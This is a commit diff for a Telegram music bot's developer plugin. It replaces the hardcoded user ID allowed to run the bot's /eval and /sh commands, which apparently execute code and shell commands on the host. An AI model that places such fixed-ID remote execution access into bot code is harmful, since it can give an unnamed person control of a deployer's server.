4a3265e0752e04bf278282c1c20761d678dc4703
Prin718 <sakarsandhya1987@gmail.com>
2025-01-22 17:26:58 +0530

    Update dev.py

--- RishuMusic/plugins/tools/dev.py
+++ RishuMusic/plugins/tools/dev.py
@@ -31,13 +31,13 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(5738579437)
+    & filters.user(7723571328)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
-    & filters.user(5738579437)
+    & filters.user(7723571328)
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -141,13 +141,13 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_edited_message(
     filters.command("sh")
-    & filters.user(5738579437)
+    & filters.user(7723571328)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("sh")
-    & filters.user(5738579437)
+    & filters.user(7723571328)
     & ~filters.forwarded
     & ~filters.via_bot
 )
